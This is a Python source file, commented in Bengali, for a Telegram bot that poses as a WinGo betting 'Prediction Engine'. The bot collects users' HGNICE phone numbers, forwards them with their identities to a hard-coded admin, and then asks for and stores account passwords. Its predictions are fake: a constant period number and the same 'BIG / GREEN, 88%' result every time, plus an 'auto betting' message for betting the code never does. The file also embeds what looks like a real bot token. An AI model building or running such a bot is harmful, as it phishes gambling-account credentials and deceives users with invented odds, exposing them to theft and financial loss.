import os
import asyncio
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# আপনার টেলিগ্রাম বটের টোকেন এবং আপনার অ্যাডমিন আইডি
BOT_TOKEN = "8648518720:AAEWG-y74hp60BcrOyLiqNiTLMUwjvutPdA"
ADMIN_ID = 8164888241

user_states = {}

def get_state(uid):
    if uid not in user_states:
        user_states[uid] = {
            "logged_in": False,
            "awaiting": None,
            "phone": "",
            "password": "",
            "game": None,
            "total_steps": 0,
            "steps": [],
            "target": 0,
            "profit": 0,
            "running": False,
            "task": None,
        }
    return user_states[uid]

def gen_period(game_mode):
    return "2026101401001"

async def auto_bet_loop(uid, ctx):
    state = get_state(uid)
    try:
        while state["running"]:
            await asyncio.sleep(10)
            if not state["running"]:
                break
            p = gen_period(state["game"])
            
            current_step = state["steps"][len(state["steps"]) - 1] if state["steps"] else 1
            msg = (
                f"🧠 **PREDICTION GENERATED** 🧠\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📌 **Period:** {p}\n"
                f"🎮 **Game:** WinGo {state['game'].upper()}\n"
                f"💰 **Current Step Bet:** {current_step}\n"
                f"🎨 **Result:** BIG / GREEN\n"
                f"🎯 **Confidence:** 88%\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⏳ *Next prediction coming in 10 seconds...*"
            )
            try:
                await ctx.bot.send_message(chat_id=uid, text=msg, parse_mode="Markdown")
            except Exception as e:
                print(f"Loop message error: {e}")
                
    except asyncio.CancelledError:
        pass

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    state = get_state(uid)
    
    if state["logged_in"] and state.get("game"):
        keyboard = [
            [
                InlineKeyboardButton("🎮 WinGo 30s", callback_data="game_30s"),
                InlineKeyboardButton("⏱️ WinGo 1m", callback_data="game_1m"),
            ]
        ]
        await update.message.reply_text(
            "✅ আপনি ইতিমধ্যে লগইন করা আছেন!\n🎯 গেম সিলেক্ট করুন:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )
        return

    text = (
        "🧠 Prediction Engine — 9 Layers\n"
        "⚡ Streak • 🔷 Pattern • 📈 Trend\n\n"
        "👇 Press the button below to LOGIN"
    )

    keyboard = [[
        InlineKeyboardButton("🔐 LOGIN TO ACCOUNT", callback_data="start_login")
    ]]

    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    username = update.effective_user.username or "No Username"
    name = update.effective_user.first_name
    state = get_state(uid)
    text = update.message.text.strip()

    # ১. ফোন নম্বর নেওয়া
    if not state["logged_in"] and state.get("awaiting") == "phone":
        state["phone"] = text
        state["awaiting"] = "pending_approval"
        
        await update.message.reply_text(
            "⏳ আপনার নম্বরটি অ্যাডমিনের কাছে অনুমোদনের জন্য পাঠানো হয়েছে। দয়া করে অপেক্ষা করুন..."
        )

        admin_text = (
            "🔔 **NEW LOGIN REQUEST!**\n\n"
            f"👤 Name: {name}\n"
            f"🆔 User ID: `{uid}`\n"
            f"🔗 Username: @{username}\n"
            f"📱 Phone: `{text}`"
        )
        admin_keyboard = [[
            InlineKeyboardButton("✅ APPROVE", callback_data=f"approve_{uid}")
        ]]
        
        try:
            await ctx.bot.send_message(
                chat_id=ADMIN_ID,
                text=admin_text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(admin_keyboard)
            )
        except Exception as e:
            print(f"Admin message error: {e}")
        return

    # ২. পাসওয়ার্ড নেওয়া
    if not state["logged_in"] and state.get("awaiting") == "password":
        state["password"] = text
        state["logged_in"] = True
        state["awaiting"] = None

        await update.message.reply_text(
            "✅ *পাসওয়ার্ড সফলভাবে গ্রহণ করা হয়েছে!*",
            parse_mode="Markdown"
        )

        keyboard = [
            [
                InlineKeyboardButton("🎮 WinGo 30s", callback_data="game_30s"),
                InlineKeyboardButton("⏱️ WinGo 1m", callback_data="game_1m"),
            ]
        ]
        await update.message.reply_text(
            "🎯 গেম সিলেক্ট করুন:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )
        return

    # ৩. মোট কয়টি স্টেপ হবে তা নির্ধারণ করা
    if state["logged_in"]:
        if state.get("awaiting") == "total_steps":
            try:
                total = int(text)
                if total <= 0:
                    raise ValueError()
                state["total_steps"] = total
                state["steps"] = []
                state["awaiting"] = "collecting_steps"
                await update.message.reply_text(
                    f"✅ মোট {total} টি স্টেপ নির্ধারণ করা হয়েছে।\n\n👉 **স্টেপ ১ (Step 1)** এর মান লিখুন:"
                )
            except:
                await update.message.reply_text("❌ সঠিক সংখ্যা লিখুন। যেমন: 5")
            return

        # ৪. সিরিয়াল অনুযায়ী একটি একটি করে স্টেপ ইনপুট নেওয়া
        if state.get("awaiting") == "collecting_steps":
            try:
                val = float(text)
                state["steps"].append(val)
                current_count = len(state["steps"])
                total_needed = state["total_steps"]

                if current_count < total_needed:
                    await update.message.reply_text(
                        f"✅ স্টেপ {current_count} সংরক্ষিত হয়েছে।\n\n👉 **স্টেপ {current_count + 1}** এর মান লিখুন:"
                    )
                else:
                    state["awaiting"] = "target"
                    steps_str = ", ".join(map(str, state["steps"]))
                    await update.message.reply_text(
                        f"✅ **সব স্টেপগুলো সফলভাবে সেট হয়েছে:** `[{steps_str}]`\n\n🎯 এখন **TARGET PROFIT** দিন (যেমন: 500):",
                        parse_mode="Markdown"
                    )
            except:
                await update.message.reply_text("❌ সঠিক সংখ্যা লিখুন। যেমন: 1, 2, 4 ইত্যাদি")
            return

        # ৫. টার্গেট প্রফিট সেট করা
        if state.get("awaiting") == "target":
            try:
                tgt = float(text)
                state["target"] = tgt
                state["awaiting"] = None
                state["profit"] = 0
                state["running"] = True
                await update.message.reply_text(
                    f"🚀 *AUTO BETTING STARTED!*\n🎯 Target: *{tgt}*\n⏳ প্রেডিকশন শুরু হচ্ছে...",
                    parse_mode="Markdown",
                )
                if state.get("task"):
                    state["task"].cancel()
                state["task"] = asyncio.create_task(auto_bet_loop(uid, ctx))
            except Exception as e:
                await update.message.reply_text("❌ সঠিক সংখ্যা লিখুন। যেমন: 500")
            return

async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    state = get_state(uid)
    data = query.data

    if data == "start_login":
        state["awaiting"] = "phone"
        login_text = "📱 আপনার HGNICE ফোন নম্বরটি লিখুন:"
        await query.message.reply_text(login_text)

    elif data.startswith("approve_"):
        target_uid = int(data.split("_")[1])
        target_state = get_state(target_uid)
        target_state["awaiting"] = "password"

        try:
            await query.edit_message_text(f"{query.message.text}\n\n✅ **APPROVED!**")
        except:
            pass

        try:
            await ctx.bot.send_message(
                chat_id=target_uid,
                text="✅ *ADMIN APPROVED YOUR ACCOUNT!*\n\n🔑 এখন আপনার একাউন্টের পাসওয়ার্ড দিন:",
                parse_mode="Markdown",
            )
        except Exception as e:
            print(f"User notify error: {e}")

    elif data.startswith("game_"):
        if not state["logged_in"]:
            await query.message.reply_text("❌ আগে লগইন করুন এবং পাসওয়ার্ড দিয়ে ভেরিফাই করুন।")
            return
        mode = data.split("_")[1]
        state["game"] = mode
        state["awaiting"] = "total_steps"
        await query.edit_message_text(
            f"🎮 *WinGo {mode.upper()} SELECTED*\n\n"
            f"🔢 আপনি মোট কয়টি স্টেপ (Steps) দিতে চান?\n*(উদাহরণস্বরূপ: 5 লিখুন)*",
            parse_mode="Markdown",
        )

def main():
    if not BOT_TOKEN:
        return

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
